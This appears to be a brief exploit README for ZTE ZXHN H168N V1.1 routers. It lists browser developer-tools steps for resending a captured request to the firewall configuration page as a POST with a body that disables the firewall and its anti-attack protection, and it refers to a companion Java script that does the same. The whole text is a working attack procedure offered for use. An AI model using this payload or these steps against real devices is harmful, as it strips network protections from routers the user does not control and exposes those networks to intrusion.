1. Go to firefox

2. Open `Inspect Element` on a tab

3. On this tab, go to the `http://[IP]/sec_firewall_conf_t.gch`

4. Capture the `GET` request from `Network` Tab in `Inspect Element`

5. Search for `Edit and resend` button and click on it

6. Change `GET` to `POST`

7. Go to request body and paste this `Level=1&AntiAttack=0&IF_ACTION=apply&IF_ERRORSTR=SUCC&IF_ERRORPARAM=SUCC&IF_ERRORTYPE=-1`

8. Send it !

   OR you can run `ZTE_Firewall_Disable.java` and Enter the IP

This Vulnerability Applies only to ZTE ZXHN H168N V1.1

Tested on: ZXHN H168N V1.1.00_ALT1 "Software Version"